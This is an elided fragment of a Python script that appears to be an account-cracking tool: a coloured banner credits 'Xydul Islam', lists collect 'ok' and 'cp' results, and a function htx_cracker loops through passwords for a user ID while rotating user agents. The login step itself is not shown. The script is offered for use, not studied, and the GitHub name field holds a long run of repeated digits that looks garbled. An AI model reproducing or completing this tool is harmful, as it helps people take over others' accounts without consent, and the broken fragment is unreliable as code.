...
time.sleep(1)
os.system('clear')
print('\033[1;32m [+]\033[1;37m UPDATE DONE \033[1;32m\033[1;37m TURAG IS A BRAND NOT A NAME')
time.sleep(2)
user=[]
ok=[]
cp=[]
...
\x1b[1;90m└━━━━━━━━━━━━━━━━━━━━━━━━┘
\033[1;96m═════════════════════════════════════════════
\x1b[1;36m{+} \x1b[1;91mTOOL CREATED BY   \x1b[1;97m: Xydul Islam
\x1b[1;36m{+} \x1b[1;92mGITHUB NAME       \x1b[1;97m: \x1b[1;94mTT- Xydul Islam411911009464522041191100946452204119110094645220
...
def htx_cracker(uid,pss):
    ...
    try:
        for ps in pss:
            ...
            sys.stdout.write(f'\r \033[1;34m[TURAG]\033[1;93m[{tl}]\033[1;97m[{loop}]\033[1;92m[OK-{len(ok)}]\r')
            sys.stdout.flush()
            ua=tst()
